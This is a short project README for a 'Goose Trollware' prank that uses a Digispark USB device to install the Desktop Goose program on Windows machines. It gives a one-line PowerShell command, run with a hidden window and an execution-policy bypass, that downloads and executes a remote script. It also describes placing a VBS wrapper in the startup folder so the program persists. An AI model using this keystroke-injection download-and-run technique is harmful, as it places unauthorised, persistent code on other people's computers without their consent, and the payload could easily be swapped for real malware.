# Goose Trollware
Goose program prank install wrapper for digispark. Keeping the link short for speed of exploit. 

See here for the original program https://desktop-goose.en.uptodown.com/windows

My code is intended to allow a digispark to plugin, quickly type the initial payload, and unplug while the code sets up the rest in the background.

The intent is to create a startup wrapper, placing it in the shell:startup folder. 

---

`i.ps1`: The install script run by the digispark

`run.vbs`: The vbs script copied to the autostartup folder.

---

To run, just have a digispark run `powershell -W H -Ex B -c "iex (iwr 'https://github.com/Reginald-Gillespie/G/raw/main/i.ps1').Content"` in the Run Dialogue. Later I may make the initial script rerun the main script as a hidden window.
